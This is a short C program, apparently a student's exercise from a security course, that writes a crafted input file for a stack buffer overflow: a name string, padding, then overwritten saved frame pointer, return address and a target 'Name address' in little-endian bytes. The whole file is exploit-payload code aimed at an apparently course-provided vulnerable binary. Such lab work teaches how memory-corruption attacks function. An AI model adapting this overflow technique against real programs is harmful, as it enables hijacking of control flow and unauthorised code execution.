createdata6.c
/*
 *  Panos Berberidis
 *  csd4376
 *  
 */
#include <stdio.h>
#include <stdlib.h>



int main() {
    FILE *fp;
    int i = 0;

    fp = fopen("data6", "w");
    if (fp == NULL) {
        fprintf(stderr, "error opening file!");
        exit(1);
    }

    
    fputc('P', fp);
    fputc('a', fp);
    fputc('n', fp);
    fputc('o', fp);
    fputc('s', fp);
    fputc('\0', fp);
 
    /* filling up rest of buffer with trash and c some of the ebp bytes */
    for (i = 0; i < 36; i++) {
    if (i == 25) {
        fputc(0x23, fp); /* keep i after the input */
    }
        fputc(0, fp);
    }

    /* ebp address */
    fputc(0x4e, fp);
    fputc(0xff, fp);
    fputc(0xff, fp);
    fputc(0xb, fp);

    /* return address */
    fputc(0x8e, fp);
    fputc(0x9e, fp);
    fputc(0x4, fp);
    fputc(0x8, fp);

    /* Name address */
    fputc(0xdc, fp);
    fputc(0x42, fp);
    fputc(0xe, fp);
    fputc(0x8, fp);

    fprintf(fp, "\n");
    fclose(fp);

    return 0;
}